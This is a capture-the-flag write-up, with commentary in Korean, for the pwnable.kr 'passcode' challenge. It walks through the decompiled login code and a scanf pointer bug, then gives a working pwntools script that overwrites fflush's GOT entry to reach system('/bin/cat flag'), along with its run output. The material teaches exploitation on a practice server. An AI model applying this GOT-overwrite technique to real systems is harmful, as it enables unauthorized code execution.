# [pwnable.kr] passcode

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Mommy told me to make a passcode based login system.
> My initial C code was compiled without any error!
> Well, there was some compiler warning, but who cares about that?
>
> ssh passcode@pwnable.kr -p2222 (pw:guest)
>
> Release: [passcode.zip](https://github.com/h0meb0dy/pwnable.kr/files/9080155/passcode.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/178168017-0bd2b4fb-8370-4fd3-b48e-e272d8ad668b.png)

## Analysis

### `main()`

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  puts("Toddler's Secure Login System 1.0 beta.");
  welcome();
  login();
  puts("Now I can safely trust you that you have credential :)");
  return 0;
}
```

### `welcome()`

```c
unsigned int welcome()
{
  char name[100]; // [esp+18h] [ebp-70h] BYREF
  unsigned int v2; // [esp+7Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  printf("enter you name : ");
  __isoc99_scanf("%100s", name);
  printf("Welcome %s!\n", name);
  return __readgsdword(0x14u) ^ v2;
}
```

`name`에 `100`바이트를 입력받고 `"%s"`로 출력한다.

### `login()`

```c
int login()
{
  int passcode1; // [esp+18h] [ebp-10h]
  int passcode2; // [esp+1Ch] [ebp-Ch]

  printf("enter passcode1 : ");
  __isoc99_scanf("%d", passcode1);
  fflush(stdin);
  printf("enter passcode2 : ");
  __isoc99_scanf("%d", passcode2);
  puts("checking...");
  if ( passcode1 != 338150 || passcode2 != 13371337 )
  {
    puts("Login Failed!");
    exit(0);
  }
  puts("Login OK!");
  return system("/bin/cat flag");
}
```

`passcode1`과 `passcode2`를 입력받아야 하는데, 실제로는 `passcode1`의 값(스택의 쓰레기값)을 주소로 받아서 그 주소에 4바이트 정수를 입력받고, `passcode2`도 마찬가지다.

`passcode1`이 `338150`이고 `passcode2`가 `13371337`이면 플래그를 획득할 수 있다. 하나라도 값이 다르면 `exit()`을 호출하여 프로그램을 종료한다.

## Exploit

`passcode1`은 쓰레기값이지만 사실 `welcome()`에서 입력받는 `name`의 범위에 포함되기 때문에 원하는 값으로 설정할 수 있다. `passcode1`에 `fflush()`의 GOT 주소를 써놓고, 거기에 `system("/bin/cat flag")`를 실행하는 코드의 주소를 쓰면 플래그를 획득할 수 있다.

```python
from pwn import *

LOCAL = False

if LOCAL:
    r = process('./release/passcode')
else:
    s = ssh('passcode', 'pwnable.kr', 2222, 'guest')
    r = s.process('./passcode')

sla = r.sendlineafter

fflush_got = 0x804a004
flag = 0x80485e3 # login+127 ( system("/bin/cat flag") )

sla('Toddler\'s Secure Login System 1.0 beta.\n', b'A' * 96 + p32(fflush_got))

r.sendline(str(flag)) # fflush@GOT -> system("/bin/cat flag")

r.interactive()
```

```
$ python3 ex.py
[+] Connecting to pwnable.kr on port 2222: Done
[*] passcode@pwnable.kr:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.179
    ASLR:     Enabled
[+] Starting remote process bytearray(b'./passcode') on pwnable.kr: pid 187645
[*] Switching to interactive mode
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x04\x04!
enter passcode1 : Sorry mom.. I got confused about scanf usage :(
Now I can safely trust you that you have credential :)
```